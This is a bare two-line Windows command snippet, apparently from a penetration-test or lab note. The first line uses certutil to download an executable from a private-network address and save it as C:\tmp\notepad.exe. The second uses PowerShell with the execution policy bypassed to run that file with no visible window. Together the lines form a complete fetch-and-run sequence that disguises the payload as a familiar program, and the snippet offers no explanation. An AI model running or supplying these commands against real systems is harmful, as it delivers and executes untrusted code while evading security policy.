certutil -urlcache -f http://192.168.56.110/notepad.exe C:\tmp\notepad.exe
powershell -ep bypass -Command 'Start-Process -NoNewWindow -FilePath "C:\tmp\notepad.exe"'
